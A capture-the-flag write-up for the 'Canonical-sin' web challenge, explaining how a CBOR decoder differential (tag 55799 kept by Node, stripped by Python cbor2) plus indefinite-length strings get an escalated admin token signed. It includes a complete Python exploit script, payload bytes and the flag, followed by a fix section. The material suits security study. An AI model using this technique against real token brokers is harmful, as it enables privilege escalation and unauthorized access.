---
title: "Canonical-sin"
description: "The instance is a \"Capability Broker\" (auth-gw, Node/Express) that mills Ed25519-signed CBOR capability tokens, plus a secret vault (vault-api, Python/Flask) that enforces role + caps…"
event: "isfcr"
category: "web"
categoryLabel: "Web"
tags: ["ISFCR CTF 2026","web"]
date: "2026-10-11"
teammate: true
source: "isfcr/writeups/canonical-sin.md"
---

**Category:** Web / Crypto
**Target:** `https://isfcrpesu-canonical-sin.chals.io/`
**Flag:** `isfcr{c4n0n1c4l_d1ff3r3nt14l_t4g_55799_1s_th3_s3lf_d3scr1b3_tr4p_2ec4}`

---

## TL;DR

The instance is a "Capability Broker" (`auth-gw`, Node/Express) that mills
Ed25519-signed **CBOR** capability tokens, plus a secret vault (`vault-api`,
Python/Flask) that enforces `role` + `caps` claims.

`POST /auth/mint` lets you merge arbitrary `extra_claims` (CBOR) into a new
signed token, but tries to prevent privilege escalation with a byte-level
denylist and a role allowlist.

The bug is a **CBOR decoder differential**:

* Node's CBOR library **preserves tag 55799** (the "self-described CBOR" magic
  tag).
* Python's `cbor2` **strips tag 55799**.

So a role value `tag55799("admin")` looks like a harmless structured/tagged
object to the broker (passing all its checks) but decodes to the plain string
`"admin"` inside the vault.

---

## Recon

### Services

```
POST /auth/login  {"username":"guest","password":"guest123"}   -> guest token, expires_in 900
GET  /auth/keys                                                 -> Ed25519 JWKS (kid main-2026-01)
GET  /auth/health                                               -> auth-gw
GET  /vault/list                                                -> public manifest
GET  /vault/health                                              -> vault-api
GET  /vault/secret/<name>                                       -> read an entry
```

`GET /vault/list` (unauthenticated!) reveals the entries:

```json
{"entries":[
  {"name":"welcome","requires_cap":"read:profile","requires_role":"user"},
  {"name":"flag","requires_cap":"read:vault","requires_role":"admin"}
]}
```

`GET /vault/secret/welcome` works with the guest token; `GET /vault/secret/flag`
returns:

```json
{"error":"forbidden: role must be 'admin'","your_role_repr":"'user'"}
```

So we need a signed token whose `role` is the string `"admin"` and whose
`caps` include `"read:vault"`.

### Token format

Three dot-separated base64url parts (no padding):

```
<header>.<payload>.<signature>
```

* **header** (CBOR): `{1: -8, 4: "main-2026-01"}`  (`-8` = EdDSA, `4` = kid)
* **payload** (CBOR):

```python
{'sub': 'guest', 'iat': 1791642738, 'exp': 1791643638,
 'role': 'user', 'caps': ['read:profile']}
```

* **signature**: 64-byte Ed25519, verified against the JWKS key
  `main-2026-01`, over the **raw (base64-decoded) bytes** — reordering keys,
  non-shortest integers, indefinite strings, duplicate keys, or changing the
  header all produce `token invalid: bad signature`.

The vault enforces `sig` length == 64 and always uses EdDSA regardless of the
header `alg`; embedded JWKs and `alg: none`/HMAC confusion are ignored. So we
cannot forge a token — we must get the broker to sign one for us.

---

## The broker: `POST /auth/mint`

`POST /auth/mint` requires a valid bearer token and a body field
`extra_claims_b64u` (base64url-encoded **CBOR**). It merges those claims on top
of freshly generated `{sub, iat, exp}`, re-signs, and returns a short-lived
token.

It defends against escalation with three layers:

| # | Check | Error |
|---|-------|-------|
| 1 | Raw byte scan of the supplied CBOR for forbidden substrings (`admin`, `root`, `superuser`, …) | `extra_claims bytes contain forbidden token "admin"` |
| 2 | Semantic role allowlist — a **text** `role` must be `"user"` | `role "admin" is not permitted` |
| 3 | Nested scan of *structured* role objects (maps) for a forbidden `role` literal | `extra_claims contain a forbidden role literal` |

Reserved keys (`sub`, `iat`, `exp`, `nbf`, `iss`, `aud`, `jti`) cannot be
overridden. `caps` entries must match a `verb:resource` shape.

### Bypassing check 1 — non-canonical CBOR

The byte scan is a naive substring match on the raw bytes. CBOR
**indefinite-length text strings** let us split the literal without ever
emitting the contiguous bytes `admin`:

```
"admin"  ->  7f 62 "ad" 63 "min" ff     # no "admin" substring in the bytes
```

But the broker then **decodes** the CBOR and rejects a text `role` of `"admin"`
(check 2). Wrapping the value in a **tag** gets around both.

### Bypassing checks 2 & 3 — tag 55799

`55799` (`0xd9d9f7`) is the CBOR **self-described CBOR** magic tag. Node's
library keeps it as a tagged value (not a text string), so:

* the role allowlist (which only applies to text strings) is skipped;
* the forbidden-literal scan only recurses into **maps** looking for a `role`
  key — a tagged scalar has no keys, so nothing is found.

The broker re-encodes the tag faithfully into the signed payload. Python's
`cbor2`, however, treats tag 55799 as the self-describe marker and **strips
it**, yielding the bare string.

---

## Exploit

```python
import base64, json, urllib.request, urllib.error, cbor2

B = "https://isfcrpesu-canonical-sin.chals.io"

# 1) guest token
req = urllib.request.Request(
    B + "/auth/login",
    data=json.dumps({"username": "guest", "password": "guest123"}).encode(),
    headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    TOK = json.loads(r.read())["token"]

b64e = lambda b: base64.urlsafe_b64encode(b).decode().rstrip("=")
b64d = lambda s: base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def tstr(s):
    b = s.encode()
    return (bytes([0x60 + len(b)]) if len(b) < 24 else bytes([0x78, len(b)])) + b

def indef(s, split):                       # indefinite-length text string
    out, i = b"\x7f", 0
    for L in split:
        out += bytes([0x60 + len(s[i:i+L])]) + s[i:i+L].encode()
        i += L
    return out + b"\xff"

# role = tag 55799 ( "admin" chunked so the byte scan misses it )
role_val = b"\xd9\xd9\xf7" + indef("admin", [2, 3])
extra = (b"\xa2"
         + tstr("role") + role_val
         + tstr("caps") + b"\x81" + tstr("read:vault"))

assert b"admin" not in extra               # bypass the raw denylist

# 2) mint the escalated token
req = urllib.request.Request(
    B + "/auth/mint",
    data=json.dumps({"extra_claims_b64u": b64e(extra)}).encode(),
    headers={"Authorization": "Bearer " + TOK,
             "Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    nt = json.loads(r.read())["token"]

print(cbor2.loads(b64d(nt.split(".")[1])))
# {'sub': 'guest', 'iat': ..., 'exp': ..., 'role': 'admin', 'caps': ['read:vault']}

# 3) read the flag
req = urllib.request.Request(
    B + "/vault/secret/flag",
    headers={"Authorization": "Bearer " + nt})
with urllib.request.urlopen(req, timeout=15) as r:
    print(r.read().decode())
```

Minted payload bytes:

```
a5
  63 "sub" 65 "guest"
  63 "iat" 1a ............
  63 "exp" 1a ............
  64 "role"  d9 d9 f7  7f 62 "ad" 63 "min" ff   # tag55799("admin")
  64 "caps" 81 6a "read:vault"
```

Output:

```
HTTP 200
isfcr{c4n0n1c4l_d1ff3r3nt14l_t4g_55799_1s_th3_s3lf_d3scr1b3_tr4p_2ec4}
```

---

## Root cause & fix

Two parsers disagree about the same signed bytes:

* The **broker** (Node) uses tags for its security decisions and keeps tag
  55799.
* The **vault** (Python `cbor2`) strips tag 55799 as the self-describe marker.

Any check performed on a decoded object must be performed with the *same*
parser/semantics that the relying party uses, and self-describing tags
(55799), unknown tags, and indefinite-length items should be rejected or
normalized before authorization. In short: **canonicalize before you trust.**

Key takeaway: a byte-level denylist is not a semantic one, and "the same CBOR"
can mean different things to different libraries.
